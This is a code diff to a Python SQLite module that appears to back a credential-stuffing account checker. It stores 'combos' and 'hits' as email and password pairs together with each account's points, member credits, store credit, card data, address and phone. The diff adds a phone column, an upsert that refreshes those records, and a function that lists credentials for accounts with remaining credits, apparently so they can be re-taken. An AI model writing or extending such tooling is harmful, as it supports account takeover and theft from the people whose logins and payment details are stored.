@@ -65,6 +65,13 @@ def init_db() -> None:
             CREATE INDEX IF NOT EXISTS idx_saved_combos_created ON saved_combos(created_at DESC);
             """
         )
+        _migrate_hits_phone_column(conn)
+
+
+def _migrate_hits_phone_column(conn: sqlite3.Connection) -> None:
+    columns = {row[1] for row in conn.execute("PRAGMA table_info(hits)").fetchall()}
+    if "phone" not in columns:
+        conn.execute("ALTER TABLE hits ADD COLUMN phone TEXT")
 
 
 @contextmanager
@@ -231,29 +238,67 @@ def clear_saved_combos() -> int:
 
 
 def insert_hit(line: str, email: str, password: str, data: dict[str, Any]) -> int | None:
+    return upsert_hit(line, email, password, data)
+
+
+def upsert_hit(line: str, email: str, password: str, data: dict[str, Any]) -> int | None:
     with connect() as conn:
+        existing = conn.execute(
+            "SELECT id FROM hits WHERE email = ? AND password = ?",
+            (email, password),
+        ).fetchone()
+        values = (
+            line,
+            int(data.get("points") or 0),
+            int(data.get("member_credits") or 0),
+            float(data.get("store_credit_balance") or 0),
+            data.get("phone"),
+            data.get("cc"),
+            data.get("address"),
+        )
+        if existing:
+            conn.execute(
+                """
+                UPDATE hits
+                SET line = ?, points = ?, member_credits = ?, store_credit_balance = ?,
+                    phone = ?, cc = ?, address = ?
+                WHERE id = ?
+                """,
+                (*values, existing["id"]),
+            )
+            return int(existing["id"])
+
         try:
             cur = conn.execute(
                 """
                 INSERT INTO hits (line, email, password, points, member_credits,
-                                  store_credit_balance, cc, address, created_at)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+                                  store_credit_balance, phone, cc, address, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 """,
                 (
                     line,
                     email,
                     password,
-                    int(data.get("points") or 0),
-                    int(data.get("member_credits") or 0),
-                    float(data.get("store_credit_balance") or 0),
-                    data.get("cc"),
-                    data.get("address"),
+                    *values,
                     _utc_now(),
                 ),
             )
             return cur.lastrowid
         except sqlite3.IntegrityError:
             return None
+
+
+def list_hits_for_recapture() -> list[dict[str, Any]]:
+    with connect() as conn:
+        rows = conn.execute(
+            """
+            SELECT id, email, password
+            FROM hits
+            WHERE member_credits > 0
+            ORDER BY id ASC
+            """
+        ).fetchall()
+        return [dict(row) for row in rows]
 
 
 def list_hits() -> list[dict[str, Any]]:
